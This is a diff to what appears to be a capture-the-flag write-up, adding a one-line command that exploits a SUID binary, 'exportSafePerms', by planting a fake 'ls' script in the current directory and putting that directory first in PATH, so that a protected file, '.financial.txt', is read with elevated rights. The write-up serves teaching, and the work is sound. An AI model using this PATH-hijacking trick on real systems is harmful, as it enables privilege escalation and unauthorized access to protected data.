@@ -35,6 +35,10 @@ Now it will look in the current directory, before looking in /bin. One thing goo
 
 ```./exportSafePerms```
 
+Because of the fact that it was a shared instance, and the directory was emptied every half second, you had to run everything in on command :
+
+```echo "cat .financial.txt" > ls && chmod +x ls && export PATH=.:$PATH && ./exportSafePerms```
+
 PS : SUID does not directly work on a python script for example, since it will be interpreted by the python interpreter, which acts as a middle man, and does not have the SUID bit.
 
 ### Flag
